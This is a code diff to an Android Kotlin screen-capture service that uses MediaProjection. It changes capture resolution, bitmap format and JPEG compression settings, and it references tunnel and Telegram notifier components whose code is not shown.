@@ -25,8 +25,8 @@ class ScreenCaptureService : Service() {
     private lateinit var tunnelManager: TunnelManager
     private lateinit var telegram: TelegramNotifier
 
-    private var screenWidth  = 0
-    private var screenHeight = 0
+    private var screenWidth   = 0
+    private var screenHeight  = 0
     private var screenDensity = 0
 
     companion object {
@@ -45,9 +45,8 @@ class ScreenCaptureService : Service() {
         (getSystemService(WINDOW_SERVICE) as WindowManager)
             .defaultDisplay.getMetrics(metrics)
 
-        // Capture at half resolution for speed
-        screenWidth   = metrics.widthPixels  / 2
-        screenHeight  = metrics.heightPixels / 2
+        screenWidth   = metrics.widthPixels
+        screenHeight  = metrics.heightPixels
         screenDensity = metrics.densityDpi
 
         captureThread = HandlerThread("CaptureThread", Process.THREAD_PRIORITY_URGENT_DISPLAY)
@@ -67,31 +66,29 @@ class ScreenCaptureService : Service() {
         val mpm = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
         mediaProjection = mpm.getMediaProjection(resultCode, data)
 
-        // 3 buffers for smooth pipeline
         imageReader = ImageReader.newInstance(screenWidth, screenHeight, PixelFormat.RGBA_8888, 3)
 
-        // Callback-based — no polling delay
         imageReader.setOnImageAvailableListener({ reader ->
             val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
             try {
-                val planes      = image.planes
-                val buffer      = planes[0].buffer
-                val pixelStride = planes[0].pixelStride
-                val rowStride   = planes[0].rowStride
-                val rowPadding  = rowStride - pixelStride * screenWidth
+                val planes       = image.planes
+                val buffer       = planes[0].buffer
+                val pixelStride  = planes[0].pixelStride
+                val rowStride    = planes[0].rowStride
+                val rowPadding   = rowStride - pixelStride * screenWidth
 
                 val bmp = Bitmap.createBitmap(
                     screenWidth + rowPadding / pixelStride,
                     screenHeight,
-                    Bitmap.Config.RGB_565   // faster than ARGB_8888
+                    Bitmap.Config.ARGB_8888
                 )
                 bmp.copyPixelsFromBuffer(buffer)
 
                 val cropped = Bitmap.createBitmap(bmp, 0, 0, screenWidth, screenHeight)
                 bmp.recycle()
 
-                val baos = ByteArrayOutputStream(32 * 1024)
-                cropped.compress(Bitmap.CompressFormat.JPEG, 60, baos)
+                val baos = ByteArrayOutputStream(64 * 1024)
+                cropped.compress(Bitmap.CompressFormat.JPEG, 55, baos)
                 cropped.recycle()
 
                 latestJpeg     = baos.toByteArray()
